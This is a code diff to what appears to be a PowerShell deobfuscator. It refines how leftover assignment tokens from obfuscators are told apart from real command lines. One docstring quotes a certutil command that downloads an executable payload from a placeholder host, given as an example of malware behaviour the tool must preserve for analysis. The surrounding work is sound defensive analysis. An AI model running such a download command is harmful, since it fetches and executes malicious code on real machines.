@@ -53,18 +53,24 @@ _PATH_EXTENSIONS = frozenset({'.exe', '.ps1', '.cmd', '.bat', '.com', '.vbs', '.
 
 def _carries_assignment_marker(cmd: Ps1CommandInvocation, name: str) -> bool:
     """
-    Whether `cmd` carries the syntactic residue of an assignment the obfuscator emitted where a
-    command was expected. Both spellings have to be recognized because the lexer splits them
-    differently: `foo =5` becomes a name and an `=`-prefixed argument, while `0042DsKaho=8602057`
-    stays a single bareword name, the digit-leading form being the one an obfuscator emits most.
+    Whether `cmd` is the syntactic residue of an assignment the obfuscator emitted where a command
+    was expected. Both spellings have to be recognized because the lexer splits them differently:
+    `foo =5` becomes a name and one `=`-prefixed argument, while `0042DsKaho=8602057` stays a single
+    bareword name, the digit-leading form being the one an obfuscator emits most.
+
+    The split spelling is recognized only when that argument is the *whole* argument list, because
+    that is what a two-token assignment leaves behind. A real invocation carrying one `=`-prefixed
+    token among several — `certutil -urlcache -split -f =http://host/payload.exe`, `findstr = log` —
+    is a command line, not a mis-lexed assignment, and matching it here erases the very
+    `try { <LOLBin> } catch { }` shape this predicate was rewritten to stop erasing.
     """
     if '=' in name:
         return True
-    for arg in cmd.arguments:
-        value = arg.value if isinstance(arg, Ps1CommandArgument) else arg
-        if isinstance(value, Ps1StringLiteral) and value.value.startswith('='):
-            return True
-    return False
+    if len(cmd.arguments) != 1:
+        return False
+    argument = cmd.arguments[0]
+    value = argument.value if isinstance(argument, Ps1CommandArgument) else argument
+    return isinstance(value, Ps1StringLiteral) and value.value.startswith('=')
 
 
 def _is_injected_noise_bareword(expr: Expression, oracle: TypeOracle) -> bool:
@@ -96,7 +102,7 @@ def _is_injected_noise_bareword(expr: Expression, oracle: TypeOracle) -> bool:
     name_lower = name.lower()
     if not _carries_assignment_marker(expr, name):
         return False
-    if name_lower in KNOWN_CMDLETS or oracle.is_shadowed(name_lower):
+    if name_lower in KNOWN_CMDLETS or oracle.is_shadowed(name_lower, expr):
         return False
     if any(sep in name for sep in ('\\', '/', ':')):
         return False
@@ -266,9 +272,10 @@ def _simulate_empty_for_terminal(node: Ps1ForLoop) -> tuple[Ps1Variable, int] | 
         return None
     predicate, bound = condition
     # A terminating linear counter reaches the bound within `distance / |step|` iterations; a couple
-    # extra guard against off-by-one and the exact-hit (`-ne`/`-eq`) cases. Exceeding this proves the
-    # condition never turns false (a wrong-direction step), so the loop is infinite and left intact.
-    # The absolute cap prevents pathological samples (e.g. bound = 2 billion) from hanging the pass.
+    # extra guard against off-by-one and the exact-hit (`-ne`/`-eq`) cases. Exceeding this proves
+    # the condition never turns false (a wrong-direction step), so the loop is infinite and left
+    # intact. The absolute cap prevents pathological samples (e.g. bound = 2 billion) from hanging
+    # the pass.
     cap = min(abs(bound - init_int.value) // abs(delta) + 2, 100_000)
     value = init_int.value
     iterations = 0
